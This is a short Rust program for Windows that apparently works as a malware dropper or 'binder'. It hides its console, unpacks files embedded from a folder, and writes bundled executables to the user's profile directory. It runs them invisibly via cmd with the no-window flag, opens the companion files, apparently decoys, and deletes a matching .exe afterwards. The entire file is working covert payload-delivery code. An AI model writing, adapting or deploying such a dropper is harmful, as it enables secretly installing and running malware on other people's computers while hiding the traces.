#![windows_subsystem = "windows"]

use std::fs;
use std::fs::write;
use std::mem::transmute;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::process::Stdio;
use std::ptr::null;

use rust_embed::RustEmbed;

#[derive(RustEmbed)]
#[folder = "tep"]
struct Asset;


#[macro_use]
macro_rules! run_cmd {
    ($cmd:expr) => {
         Command::new("cmd")
            .creation_flags(0x08000000)
            .args(&["/c", $cmd])
            .stdout(Stdio::piped())
            .spawn();
    };
}

fn main() {
    for i in Asset::iter() {
        let path = i.as_ref();
        let file = Asset::get(path).unwrap();
        let name = i.as_ref().to_string();
        if i.as_ref().to_string().contains("exe") {
            let user_dir = std::env::var("USERPROFILE").expect("无法获取用户目录");
            println!("{}", user_dir);
            let exe_path = format!("{}\\{}", user_dir, name);
            let _ = write(&exe_path, file.data);
            run_cmd!(&exe_path);
        } else {
            let _ = write(format!("{}", name), file.data);
            run_cmd!(&name);
            let name: Vec<&str> = path.split(".").collect();
            run_cmd!(format!("del {}.exe",name[0]).as_str());
        }
    }
}



